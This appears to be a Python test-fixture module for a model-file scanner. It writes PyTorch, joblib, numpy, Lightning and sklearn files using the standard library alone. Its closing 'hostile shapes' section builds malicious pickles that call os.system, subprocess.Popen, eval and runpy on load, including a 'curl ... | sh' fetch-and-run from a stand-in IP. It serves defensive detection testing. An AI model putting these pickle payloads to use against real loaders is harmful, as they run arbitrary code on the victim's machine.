"""FP-MODEL-FILES: model files written in the tests as PyTorch, joblib, numpy, pandas and Lightning write them, with
the standard library only. Nothing here is a test, and nothing is ever unpickled or loaded.

The libraries are not installed for the suite (torch is too big): while a file is written, stand-in modules take
their names in sys.modules (`standins`), so that pickle records the real modules' and functions' names, as
torch.save, joblib.dump and numpy.save do; the entries are put back after. The bytes laid out around the pickles
(torch.save's zip and its legacy stream, joblib's arrays after their wrappers, an .npy's header) are written as those
libraries write them (torch/serialization.py, joblib/numpy_pickle.py, numpy/lib/format.py).

The hostile shapes are inert bytes: they name os.system and the like, with commands that are never run.
"""
import collections
import contextlib
import functools
import gzip
import io
import os
import pickle
import struct
import sys
import types
import zipfile
import zlib

__all__ = ["standins", "fn", "cls", "Storage", "Tensor", "tensor", "state_dict_pt", "full_model_pt",
           "lightning_ckpt", "legacy_pt", "plain_pickle", "joblib_dump", "npy", "npz", "torch_zip", "hostile",
           "os_system", "stack_global_system", "build_setstate", "Reduce"]


@contextlib.contextmanager
def standins(names):
    """`names`: {"module": {"name": object}}: each module (and its packages) made in sys.modules, the objects set on
    it; what sys.modules held before is put back."""
    saved, made = {}, {}
    for mod in names:
        parts = mod.split(".")
        for k in range(1, len(parts) + 1):
            m = ".".join(parts[:k])
            if m not in made:
                saved.setdefault(m, sys.modules.get(m))
                made[m] = types.ModuleType(m)
                sys.modules[m] = made[m]
            if k > 1:
                setattr(made[".".join(parts[:k - 1])], parts[k - 1], made[m])
    for mod, objs in names.items():
        for name, obj in objs.items():
            target = made[mod]
            path = name.split(".")
            for p in path[:-1]:
                target = getattr(target, p)
            setattr(target, path[-1], obj)
    try:
        yield made
    finally:
        for m, old in saved.items():
            if old is None:
                sys.modules.pop(m, None)
            else:
                sys.modules[m] = old


def fn(module, name):
    """A function named module.name (it is never called)."""
    def f(*args, **kwargs):
        raise AssertionError("a stand-in is never called")
    f.__module__, f.__qualname__, f.__name__ = module, name, name.rsplit(".", 1)[-1]
    return f


def cls(module, name, base=object, **ns):
    return type(name.rsplit(".", 1)[-1], (base,), {"__module__": module, "__qualname__": name, **ns})


class Reduce:
    """An object that pickles as `callable(*args)` (with a BUILD of `state` when given)."""

    def __init__(self, callable_, args, state=None):
        self.callable_, self.args, self.state = callable_, args, state

    def __reduce__(self):
        if self.state is None:
            return self.callable_, self.args
        return self.callable_, self.args, self.state


# ---- PyTorch ------------------------------------------------------------------------------------------------------

REBUILD_V2 = fn("torch._utils", "_rebuild_tensor_v2")
REBUILD_PARAM = fn("torch._utils", "_rebuild_parameter")
FLOAT_STORAGE = cls("torch", "FloatStorage")
TORCH = {"torch._utils": {"_rebuild_tensor_v2": REBUILD_V2, "_rebuild_parameter": REBUILD_PARAM},
         "torch": {"FloatStorage": FLOAT_STORAGE}}


class Storage:
    """A tensor's storage: torch.save pickles it as a persistent id."""

    def __init__(self, key, numel):
        self.key, self.numel = key, numel


def tensor(storage, shape, stride, param=False):
    t = Reduce(REBUILD_V2, (storage, 0, tuple(shape), tuple(stride), False, collections.OrderedDict()))
    return Reduce(REBUILD_PARAM, (t, True, collections.OrderedDict())) if param else t


Tensor = tensor


class _TorchPickler(pickle.Pickler):
    def persistent_id(self, obj):
        if isinstance(obj, Storage):
            return ("storage", FLOAT_STORAGE, obj.key, "cpu", obj.numel)
        return None


def _torch_pickle(obj, extra=None):
    buf = io.BytesIO()
    with standins({**TORCH, **(extra or {})}):
        _TorchPickler(buf, protocol=2).dump(obj)
    return buf.getvalue()


def torch_zip(data_pkl, storages=(), name="archive", more=()):
    """torch.save's archive: <name>/data.pkl first, its records, each storage's bytes, the writer's own records."""
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as z:
        z.writestr(f"{name}/data.pkl", data_pkl)
        z.writestr(f"{name}/.format_version", "1")
        z.writestr(f"{name}/.storage_alignment", "64")
        z.writestr(f"{name}/byteorder", "little")
        for key, raw in storages:
            z.writestr(f"{name}/data/{key}", raw)
        for n, raw in more:
            z.writestr(n, raw)
        z.writestr(f"{name}/version", "3\n")
        z.writestr(f"{name}/.data/serialization_id", "1234567890123456789012345678901234567890")
    return out.getvalue()


# ---- a checkpoint of large storages, never held whole (John's decision of Oct 21: read by range) ----------------

@functools.lru_cache(maxsize=None)
def _crc_zeros(n):
    crc, chunk = 0, bytes(1 << 20)
    while n:
        k = min(n, len(chunk))
        crc = zlib.crc32(chunk if k == len(chunk) else chunk[:k], crc)
        n -= k
    return crc


def big_torch_zip(data_pkl, storage_sizes, name="archive", more=()):
    """torch.save's archive (stored, as torch.save writes it) whose storages are `storage_sizes` bytes of zeros each,
    as parts: [bytes, or the length of a run of zeros], to write as a sparse file (write_parts) or stream into an
    archive (PartsReader); zip64 where sizes or offsets pass 4 GiB. `more`: (name, bytes) entries after the storages."""
    entries = [(f"{name}/data.pkl", data_pkl), (f"{name}/.format_version", b"1"), (f"{name}/.storage_alignment", b"64"),
               (f"{name}/byteorder", b"little")]
    entries += [(f"{name}/data/{k}", n) for k, n in enumerate(storage_sizes)]
    entries += list(more)
    entries += [(f"{name}/version", b"3\n"), (f"{name}/.data/serialization_id", b"1234567890")]
    parts, pos, cd, z64 = [], 0, b"", False
    big = 0xFFFFFFFF
    for fname, body in entries:
        n = body if isinstance(body, int) else len(body)
        crc = _crc_zeros(body) if isinstance(body, int) else zlib.crc32(body)
        fn = fname.encode()
        wide, far = n >= big, pos >= big
        z64 |= wide or far
        lx = struct.pack("<HHQQ", 1, 16, n, n) if wide else b""
        m = big if wide else n
        parts.append(struct.pack("<4s5H3L2H", b"PK\x03\x04", 45, 0, 0, 0, 0, crc, m, m, len(fn), len(lx)) + fn + lx)
        parts.append(body)
        x = (struct.pack("<QQ", n, n) if wide else b"") + (struct.pack("<Q", pos) if far else b"")
        cx = struct.pack("<HH", 1, len(x)) + x if x else b""
        cd += struct.pack("<4s6H3L5H2L", b"PK\x01\x02", 45, 45, 0, 0, 0, 0, crc, m, m, len(fn), len(cx), 0, 0, 0, 0,
                          big if far else pos) + fn + cx
        pos += 30 + len(fn) + len(lx) + n
    count = len(entries)
    if z64 or pos >= big:
        end = struct.pack("<4sQ2H2L4Q", b"PK\x06\x06", 44, 45, 45, 0, 0, count, count, len(cd), pos)
        end += struct.pack("<4sLQL", b"PK\x06\x07", 0, pos + len(cd), 1)
        end += struct.pack("<4s4H2LH", b"PK\x05\x06", 0, 0, 0xFFFF, 0xFFFF, big, big, 0)
    else:
        end = struct.pack("<4s4H2LH", b"PK\x05\x06", 0, 0, count, count, len(cd), pos, 0)
    parts.append(cd + end)
    return parts


def parts_size(parts):
    return sum(p if isinstance(p, int) else len(p) for p in parts)


def write_parts(path, parts):
    """The parts as a file, its runs of zeros holes (a sparse file: it takes the disk its bytes take)."""
    with open(path, "wb") as fh:
        for p in parts:
            if isinstance(p, int):
                fh.seek(p, os.SEEK_CUR)
            else:
                fh.write(p)
        fh.truncate()


class PartsReader(io.RawIOBase):
    """The parts read one chunk at a time (a member streamed into a tar or a zip), never held whole."""

    def __init__(self, parts):
        self.parts, self.k, self.at = list(parts), 0, 0

    def readable(self):
        return True

    def readinto(self, b):
        while self.k < len(self.parts):
            p = self.parts[self.k]
            n = p if isinstance(p, int) else len(p)
            if self.at < n:
                take = min(len(b), n - self.at)
                b[:take] = bytes(take) if isinstance(p, int) else p[self.at:self.at + take]
                self.at += take
                return take
            self.k, self.at = self.k + 1, 0
        return 0


def state_dict_pt(name="archive"):
    """torch.save(model.state_dict()): an OrderedDict of tensors, with its _metadata."""
    s0, s1 = Storage("0", 6), Storage("1", 2)
    sd = collections.OrderedDict([("fc.weight", tensor(s0, (2, 3), (3, 1))), ("fc.bias", tensor(s1, (2,), (1,)))])
    sd._metadata = collections.OrderedDict([("", {"version": 1}), ("fc", {"version": 1})])
    return torch_zip(_torch_pickle(sd), [("0", bytes(24)), ("1", bytes(8))], name)


def full_model_pt(module="mymodel", name="archive"):
    """torch.save(model): the model's class and torch.nn's remade by NEWOBJ and BUILD, its parameters rebuilt."""
    linear = cls("torch.nn.modules.linear", "Linear")
    net = cls(module, "Net")
    lin = linear.__new__(linear)
    lin.__dict__.update({"training": True, "_parameters": collections.OrderedDict(
        [("weight", tensor(Storage("0", 6), (2, 3), (3, 1), param=True))]), "_buffers": collections.OrderedDict(),
        "_modules": collections.OrderedDict(), "in_features": 3, "out_features": 2})
    m = net.__new__(net)
    m.__dict__.update({"training": True, "_parameters": collections.OrderedDict(), "_buffers": collections.OrderedDict(),
                       "_modules": collections.OrderedDict([("fc", lin)]), "_forward_hooks": collections.OrderedDict()})
    data = _torch_pickle(m, {"torch.nn.modules.linear": {"Linear": linear}, module: {"Net": net}})
    return torch_zip(data, [("0", bytes(24))], name)


def lightning_ckpt():
    """A Lightning checkpoint: its loops, callbacks and optimizer states, and hyperparameters of plain data (an
    AttributeDict, a Namespace, paths, an omegaconf DictConfig, typing objects)."""
    import argparse
    import pathlib
    import typing
    attrdict = cls("lightning.fabric.utilities.data", "AttributeDict", dict)
    dictconfig = cls("omegaconf.dictconfig", "DictConfig")
    metadata = cls("omegaconf.base", "ContainerMetadata")
    anynode = cls("omegaconf.nodes", "AnyNode")
    meta = metadata.__new__(metadata)
    meta.__dict__.update({"ref_type": typing.Any, "object_type": dict, "optional": True, "key": None, "flags": {},
                          "flags_root": False, "resolver_cache": collections.defaultdict(dict), "key_type": typing.Any,
                          "element_type": typing.Any})
    node = anynode.__new__(anynode)
    node.__dict__.update({"_val": 64, "_metadata": None, "_parent": None})
    cfg = dictconfig.__new__(dictconfig)
    cfg.__dict__.update({"_metadata": meta, "_parent": None, "_content": {"hidden": node}, "_flags_cache": None})
    hp = attrdict(lr=1e-3, hidden=64, data_dir=pathlib.PurePosixPath("/data/train"),
                  args=argparse.Namespace(batch_size=32, precision="16-mixed"), cfg=cfg,
                  schedule=typing.Optional[int])
    s = Storage("0", 6)
    ckpt = {
        "epoch": 3, "global_step": 120, "pytorch-lightning_version": "2.4.0",
        "state_dict": collections.OrderedDict([("model.w", tensor(s, (2, 3), (3, 1)))]),
        "loops": {"fit_loop": {"state_dict": {}, "epoch_progress": {"total": {"ready": 4, "completed": 3}}}},
        "callbacks": {"ModelCheckpoint{'monitor': 'val_loss', 'mode': 'min'}": {
            "monitor": "val_loss", "best_model_score": tensor(Storage("1", 1), (), ()),
            "best_model_path": "/ckpt/epoch=3-step=120.ckpt", "dirpath": "/ckpt", "kth_best_model_path": "",
            "best_k_models": {"/ckpt/epoch=3-step=120.ckpt": tensor(Storage("1", 1), (), ())}}},
        "optimizer_states": [{"state": {0: {"step": tensor(Storage("2", 1), (), ()),
                                            "exp_avg": tensor(Storage("3", 6), (2, 3), (3, 1))}},
                              "param_groups": [{"lr": 1e-3, "betas": (0.9, 0.999), "eps": 1e-8, "params": [0]}]}],
        "lr_schedulers": [{"step_size": 10, "gamma": 0.1, "base_lrs": [1e-3], "last_epoch": 3}],
        "hparams_name": "kwargs", "hyper_parameters": hp,
    }
    data = _torch_pickle(ckpt, {"lightning.fabric.utilities.data": {"AttributeDict": attrdict},
                                "omegaconf.dictconfig": {"DictConfig": dictconfig},
                                "omegaconf.base": {"ContainerMetadata": metadata},
                                "omegaconf.nodes": {"AnyNode": anynode}})
    return torch_zip(data, [(k, bytes(24)) for k in "0123"], "epoch=3-step=120")


MAGIC = 0x1950A86A20F9469CFC6C


def legacy_pt(obj=None):
    """torch.save(..., _use_new_zipfile_serialization=False): the magic number, the protocol version, the system's
    sizes, the object, the storage keys (each a pickle), then each storage's numel and bytes."""
    if obj is None:
        obj = collections.OrderedDict([("w", tensor(Storage("0", 4), (4,), (1,)))])
    out = io.BytesIO()
    for head in (MAGIC, 1001, {"protocol_version": 1001, "little_endian": True,
                               "type_sizes": {"short": 2, "int": 4, "long": 4}}):
        pickle.dump(head, out, protocol=2)
    with standins(TORCH):
        _TorchPickler(out, protocol=2).dump(obj)
    pickle.dump(["0"], out, protocol=2)
    out.write(struct.pack("<q", 4) + bytes(16))
    return out.getvalue()


def plain_pickle(obj, protocol=4, extra=None):
    with standins(extra or {}):
        return pickle.dumps(obj, protocol=protocol)


# ---- numpy, joblib -----------------------------------------------------------------------------------------------

def _numpy(two=True):
    core = "numpy._core" if two else "numpy.core"
    return {f"{core}.multiarray": {"_reconstruct": fn(f"{core}.multiarray", "_reconstruct"),
                                   "scalar": fn(f"{core}.multiarray", "scalar")},
            "numpy": {"ndarray": cls("numpy", "ndarray"), "dtype": fn("numpy", "dtype")}}


def _dtype(np, descr, elsize=-1, flags=0, order="<"):
    return Reduce(np["numpy"]["dtype"], (descr, False, True), (3, order, None, None, None, elsize, -1, flags))


def _object_array(np, items, two=True):
    """An object array as ndarray.__reduce__ pickles it: _reconstruct, then a BUILD of its items."""
    core = "numpy._core" if two else "numpy.core"
    return Reduce(np[f"{core}.multiarray"]["_reconstruct"], (np["numpy"]["ndarray"], (0,), b"b"),
                  (1, (len(items),), _dtype(np, "O8", 8, 63, "|"), False, list(items)))


def npy(descr, payload, shape=(3,)):
    """An .npy (format version 1.0): its header, then `payload` (an array's bytes, or an object array's pickle)."""
    header = "{'descr': %r, 'fortran_order': False, 'shape': %r, }" % (descr, shape)
    pad = 64 - (10 + len(header) + 1) % 64
    header = (header + " " * pad + "\n").encode("latin-1")
    return b"\x93NUMPY\x01\x00" + struct.pack("<H", len(header)) + header + payload


def npy_objects(items, two=True):
    np = _numpy(two)
    with standins(np):
        return npy("|O", pickle.dumps(_object_array(np, items, two), protocol=3))


def npz(members, compressed=False):
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED if compressed else zipfile.ZIP_STORED) as z:
        for name, data in members.items():
            z.writestr(name, data)
    return out.getvalue()


class _Array:
    """An array for joblib_dump: its dtype descr, shape and bytes (or its objects)."""

    def __init__(self, descr, shape, raw=b"", objects=None):
        self.descr, self.shape, self.raw, self.objects = descr, shape, raw, objects


def joblib_dump(obj, compress=None, aligned=True, extra=None, two=True):
    """joblib.dump: the object pickled (protocol 4 as joblib's NumpyPickler: framed), each array replaced by a
    NumpyArrayWrapper whose BUILD is followed by its bytes (a padding byte, the padding, the data; or an object
    array's own pickle); compressed with zlib or gzip when asked."""
    np = _numpy(two)
    wrapper = cls("joblib.numpy_pickle", "NumpyArrayWrapper")
    mods = {**np, "joblib.numpy_pickle": {"NumpyArrayWrapper": wrapper}, **(extra or {})}
    out = io.BytesIO()

    class P(pickle._Pickler):
        def save(self, o, save_persistent_id=True):
            if isinstance(o, _Array):
                w = wrapper.__new__(wrapper)
                objects = o.objects is not None
                w.__dict__.update({"subclass": np["numpy"]["ndarray"], "shape": o.shape, "order": "C",
                                   "dtype": _dtype(np, "O8", 8, 63, "|") if objects else _dtype(np, o.descr),
                                   "allow_mmap": not objects})
                if aligned:
                    w.__dict__["numpy_array_alignment_bytes"] = 16
                pickle._Pickler.save(self, w)
                self.framer.commit_frame(force=True)
                if objects:
                    pickle.dump(_object_array(np, o.objects, two), out, protocol=5)
                else:
                    f = out
                    if aligned:
                        pos = f.tell() + 1
                        pad = 16 - pos % 16
                        f.write(bytes([pad]) + b"\xff" * pad)
                    f.write(o.raw)
                return
            return pickle._Pickler.save(self, o, save_persistent_id)

    with standins(mods):
        P(out, protocol=4).dump(obj)
    data = out.getvalue()
    if compress == "zlib":
        return zlib.compress(data, 3)
    if compress == "gzip":
        return gzip.compress(data, 3)
    return data


def sklearn_tree():
    """A fitted DecisionTreeClassifier as sklearn pickles it: the estimator remade by NEWOBJ and BUILD, its Tree
    called with numbers and an array (Tree.__reduce__), its arrays joblib's."""
    est = cls("sklearn.tree._classes", "DecisionTreeClassifier")
    tree = fn("sklearn.tree._tree", "Tree")
    e = est.__new__(est)
    t = Reduce(tree, (4, _Array("i8", (1,), struct.pack("<q", 2)), 1),
               {"max_depth": 1, "node_count": 3, "nodes": _Array("V64", (3,), bytes(192)),
                "values": _Array("f8", (3, 1, 2), bytes(48))})
    e.__dict__.update({"criterion": "gini", "splitter": "best", "max_depth": None, "random_state": 0,
                       "n_features_in_": 4, "classes_": _Array("i8", (2,), struct.pack("<qq", 0, 1)),
                       "tree_": t, "_sklearn_version": "1.9.1"})
    return joblib_dump(e, extra={"sklearn.tree._classes": {"DecisionTreeClassifier": est},
                                 "sklearn.tree._tree": {"Tree": tree}})


# ---- hostile shapes (inert) ---------------------------------------------------------------------------------------

def os_system(cmd="id", protocol=2):
    """A pickle that calls os.system(cmd): os.system's own name (posix.system on POSIX, nt.system on Windows)."""
    return pickle.dumps(Reduce(os.system, (cmd,)), protocol=protocol)


def stack_global_system(cmd="id"):
    """Protocol 4: os and system as strings memoized first, the STACK_GLOBAL reading them from the memo."""
    c = cmd.encode()
    return (b"\x80\x04\x8c\x02os\x94\x8c\x06system\x94\x8c\x05noise0" + b"h\x00h\x01\x93"
            + b"\x8c" + bytes([len(c)]) + c + b"\x85R.")


def build_setstate(callee_module="os", callee_name="system", cmd="id"):
    """An object whose __setstate__ becomes the callee, then a BUILD that calls it with `cmd`."""
    m, n, c = callee_module.encode(), callee_name.encode(), cmd.encode()
    return (b"\x80\x02cargparse\nNamespace\n)\x81}\x8c\x0c__setstate__c" + m + b"\n" + n + b"\nsb"
            + b"\x8c" + bytes([len(c)]) + c + b"b.")


def hostile():
    """Each code-running shape, by name."""
    return {
        "reduce.pkl": os_system("curl -s http://192.0.2.1/a | sh"),
        "stack_global.pkl": stack_global_system(),
        "inst.pkl": b"(S'id'\nios\nsystem\n.",
        "obj.pkl": b"\x80\x02(csubprocess\nPopen\n\x8c\x02sho.",
        "newobj.pkl": b"\x80\x02csubprocess\nPopen\n\x8c\x02sh\x85\x81.",
        "build.pkl": build_setstate(),
        "eval.pkl": b"\x80\x02c__builtin__\neval\n\x8c\x061+1 ;x\x85R.",
        "runpy.pkl": b"\x80\x04\x8c\x05runpy\x8c\t_run_code\x93\x8c\x02x=\x85R.",
    }


def peak_kib():
    """The process's peak resident memory in KiB: getrusage gives KiB on Linux and bytes on macOS (where the
    200 MB checkpoint tests read 156,270,592 as KiB, Oct 29). Windows has no getrusage: its peak working set
    (GetProcessMemoryInfo's PeakWorkingSetSize, in bytes), what it counts as resident."""
    if sys.platform == "win32":
        return _peak_working_set() // 1024
    import resource
    peak = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    return peak // 1024 if sys.platform == "darwin" else peak


def _peak_working_set():
    """Windows: this process's PeakWorkingSetSize (PROCESS_MEMORY_COUNTERS, psapi.h), in bytes."""
    import ctypes
    from ctypes import wintypes

    class Counters(ctypes.Structure):
        _fields_ = [("cb", wintypes.DWORD), ("PageFaultCount", wintypes.DWORD),
                    ("PeakWorkingSetSize", ctypes.c_size_t), ("WorkingSetSize", ctypes.c_size_t),
                    ("QuotaPeakPagedPoolUsage", ctypes.c_size_t), ("QuotaPagedPoolUsage", ctypes.c_size_t),
                    ("QuotaPeakNonPagedPoolUsage", ctypes.c_size_t), ("QuotaNonPagedPoolUsage", ctypes.c_size_t),
                    ("PagefileUsage", ctypes.c_size_t), ("PeakPagefileUsage", ctypes.c_size_t)]
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    psapi = ctypes.WinDLL("psapi", use_last_error=True)
    kernel32.GetCurrentProcess.argtypes = []
    kernel32.GetCurrentProcess.restype = wintypes.HANDLE
    psapi.GetProcessMemoryInfo.argtypes = [wintypes.HANDLE, ctypes.POINTER(Counters), wintypes.DWORD]
    psapi.GetProcessMemoryInfo.restype = wintypes.BOOL
    counters = Counters()
    counters.cb = ctypes.sizeof(Counters)
    if not psapi.GetProcessMemoryInfo(kernel32.GetCurrentProcess(), ctypes.byref(counters), counters.cb):
        raise ctypes.WinError(ctypes.get_last_error())
    return counters.PeakWorkingSetSize
